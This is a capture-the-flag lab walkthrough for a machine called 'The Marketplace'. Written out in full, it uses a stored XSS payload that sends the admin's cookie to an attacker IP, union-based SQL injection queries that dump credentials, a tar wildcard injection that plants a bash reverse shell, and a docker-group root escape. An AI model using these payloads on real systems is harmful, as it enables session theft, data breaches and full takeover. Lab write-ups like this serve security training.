<h2>Target: 10.10.140.84    The Marketplace</h2>

<b>Initial Access:</b><br>
nmap -Pn 10.10.140.84 -p- --min-rate=5000|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports: 22,80

Enumerate these open ports further with nmap: <br>
nmap -Pn 10.10.140.84 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.marketplace

![image](https://user-images.githubusercontent.com/93153300/203442370-8f8b63ed-fb35-40aa-a032-1235c03a7967.png)
 
Visiting port 80 shows:

![image](https://user-images.githubusercontent.com/93153300/203442387-c58f3f19-d6f7-4584-80fc-a24eb65e1f75.png)
 
Click on ‘sign up’ and create a user (I will create a user named ‘johnwick’). After signing up, click on ‘login’ and enter the credentials for the user we just created.  After logging in, the page shows:
 
![image](https://user-images.githubusercontent.com/93153300/203442403-8551f39c-f481-42f3-be4f-85e20c4dc62f.png)
 
Clicking on ‘New listing’ (located in the top right) shows:

![image](https://user-images.githubusercontent.com/93153300/203442417-2cb819c5-4218-4466-85e0-40a4565106ac.png)

Enter a ‘title’ and ‘description’ (we will enter ‘test’ for both) and then click on ‘Submit Query’.  After clicking ‘Submit Query’ we are taken to a directory ‘/item/7’ which shows our ‘new listing’ we just created:
 
![image](https://user-images.githubusercontent.com/93153300/203442438-8780b16d-1a93-491b-b7a7-67612aa96e69.png)

At the bottom, clicking on ‘Report listing to admins’ shows: 

*(Machine restarted a few times so the target ip address changed a few times)

![image](https://user-images.githubusercontent.com/93153300/203442461-6a93f6eb-5366-4f33-b3be-52dd18eeaa6b.png)

The message indicates that an admin will review our message.  If the site is vulnerable to xss then we can use this to steal the admin’s token.  To test for xss, we will do the same steps we just did to create a ‘new listing’, but this time we will enter in the ‘description’ a xss payload: <script>alert(1)</script> <br>

Upon repeating the steps to create a ‘new listing’, entering the xss payload in the 'description, and clicking on ‘submit query’ we get an alert:
 
![image](https://user-images.githubusercontent.com/93153300/203442487-d7c189b7-ce94-44a7-974b-db9afdd9e5d0.png)

This shows the site is vulnerable to xss.  Based on this information, we will perform xss to steal the admin’s token.  The steps for this attack are as follows:

Step 1: Like we did before, click on ‘new listing’  and fill out the title with any name you want.  <br>
Step 2:  In the ‘description’ enter the xss payload for stealing the token: <script>var i=new Image;i.src="http://10.2.1.148/?"+document.cookie;</script>  <br>
Step 3: Open a netcat listener to catch the admin token: nc -lvnp 80. <br>
Step 4: Submit the query and wait for the netcat listener to capture the token.

![image](https://user-images.githubusercontent.com/93153300/203442520-9dc169db-0e0b-449a-b361-6c3f293e20a1.png)
 
We captured the admin’s jwt token.  Open the developer tools (press F12) and replace the token value with the admin token we captured: 
 
![image](https://user-images.githubusercontent.com/93153300/203442540-f33827f9-e5a3-4f61-baff-cd8b9c3493ff.png)
 
Refresh the page.  We are now logged in as the admin user.  We can get the first flag in the ‘Administration panel’:

![image](https://user-images.githubusercontent.com/93153300/203442552-5ff3a42d-1863-4a92-9907-abbb9baec2d7.png)
 
Clicking on the box containing ‘ID:2’ takes us to a directory ‘/admin?user=2’:

![image](https://user-images.githubusercontent.com/93153300/203442573-a7068a19-480d-448f-b51f-decdb33817b6.png)
 
Test the ‘?user=’ parameter for sql injection by replacing the ‘2’ with a single quote: 
 
![image](https://user-images.githubusercontent.com/93153300/203442587-792d72c1-770e-40ec-9198-63bc0591869a.png)
 
This response indicates that the site is vulnerable to sql injection.  Capture the request in burpsuite and send the request to repeater.  For all requests in burp suite we will url encode the payload that we send. Here are the steps for manual sql injection for this site: 
  
Step 1: Use ‘union’ to find the # of columns in the query with the following query: 0+union+select+null--+-  <br>
Keep adding another ‘null’ until the response from the server is a valid 200 response.  Upon getting to 4 columns of null we get a valid 200 response.  The valid union query is: <br> 0+union+select+null,null,null,null--+-

Step 2: Find a column that reflects data on the page by replacing the null value with a string value.  If the page returns the string value then we know it reflects that column in the query:

![image](https://user-images.githubusercontent.com/93153300/203442633-6ae2660e-6c46-47de-9830-e8845960bd44.png)
 
This shows that the string ‘johnwick’ in our union query in the first column is returned on the page.  So the first column in the union query reflects data on the page.

Step 3: Find what type of database is being used with the following query: <br> 0+union+select+database(),null,null,null--+- <br>

![image](https://user-images.githubusercontent.com/93153300/203442660-fe45fe81-4b48-4744-8552-b4a65ce0cf5c.png)
 
The server shows a valid 200 response, so the syntax ‘database()’ was correct.  The type of database that uses the syntax ‘database()’ is mysql.  So we now know the database being used is mysql. Secondly, the response shows the database name is 'marketplace'.

Step 4: Find the tables in the ‘marketplace’ database with the following query: <br> 0+union+select+group_concat(table_name),null,null,null+from+information_schema.tables+where+table_schema%3d'marketplace'--+-

![image](https://user-images.githubusercontent.com/93153300/203442685-2f2b9ef2-7e7b-41b8-a965-9628f439e2c3.png)
 
The response shows the tables are: items,messages,users.

Step 5: Find the columns to table ‘users’ with the following query: <br>  0+union+select+group_concat(column_name),null,null,null+from+information_schema.columns+where+table_name%3d'users'--+-

![image](https://user-images.githubusercontent.com/93153300/203442747-99ca6f72-9f9d-401f-b1f8-0d3a7b6241f5.png)
 
The response shows the columns in the ‘users’ table are: id,username,password,isAdministrator

Step 6: Dump the data from the columns ‘username’ and ’password’ with the following query: <br> 0+union+select+group_concat(username,':',password+separator+'\n'),null,null,null+from+users--+-

![image](https://user-images.githubusercontent.com/93153300/203442768-e40f2e4f-5b2f-432e-b844-bc46fa372197.png)
 
The response shows usernames and hashed passwords.  Trying brute force to crack these hashes with john or hashcat takes too long.  Let’s go back and look at a different table we found named ‘messages’.  Dump the columns to the table ‘messages’ with the following query: <br> 0+union+select+group_concat(column_name),null,null,null+from+information_schema.columns+where+table_name%3d'messages'--+-
 
![image](https://user-images.githubusercontent.com/93153300/203442795-7e2e756f-46af-4113-80f3-4ccc0720a3be.png)
 
The response shows a number of columns. Dump the column ‘message_content’ with the following query: 0+union+select+group_concat(message_content),null,null,null+from+messages--+- 
 
![image](https://user-images.githubusercontent.com/93153300/203442827-2e6e6760-ab42-4278-86b7-73cf8249215b.png)
  
The response shows a passowrd: @b_ENXkGYUCAv3zJ <br>
Previously, when we dumped the usernames and passwords columns we found usernames: jake, michael, and system.  Try logging in via ssh with those users using this password ‘@b_ENXkGYUCAv3zJ’.  

ssh jake@10.10.21.162  → when prompted for password then enter the password. <br>
It worked, we have shell as jake.  We can get the 2nd flag in /home/jake/user.txt.
___________________________________________________________________________
<b>Lateral Movement:</b><br>
Running command ‘sudo -l’ shows:

![image](https://user-images.githubusercontent.com/93153300/203442876-dbe2fa54-abb8-480c-abf0-3028b2691e58.png)

We have permission to run this file with sudo permissions as michael.  Read the content of /opt/backups/backup.sh:

![image](https://user-images.githubusercontent.com/93153300/203442886-5918ac8f-2a53-4fe2-9160-79fc6753c0be.png)
 
The file shows a ‘tar’ command with a wildcard.  We will use this to get user michael with the following steps:

Step 1:  Go to directory /opt/backups <br>
Step 2: Create a file named 'test' that contains a reverse shell: echo -n 'bash -c "bash -i >& /dev/tcp/10.2.1.148/443 0>&1"' >test <br>
Step 3: chmod 777 test <br>
Step 4: Run command: echo "" > "--checkpoint-action=exec=sh test" <br>
Step 5: echo "" > --checkpoint=1 <br>
Step 6: open a netcat listener (I will use pwncat because it gives a better shell): pwncat-cs -lp 443 <br>
Step 7: sudo -u michael /opt/backups/backup.sh

Our netcat listener got a shell as user michael.  
___________________________________________________________________________
<b>Privilege Escalation:</b><br>
Command ‘id’ shows that michael is in the docker group.  We will use this to get root. <br>
Run command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh

We have shell as root.  We can get the final flag in /root/root.txt

![image](https://user-images.githubusercontent.com/93153300/203442962-22c98a14-7dbb-4b8e-952d-63bd5f5d0ad1.png)
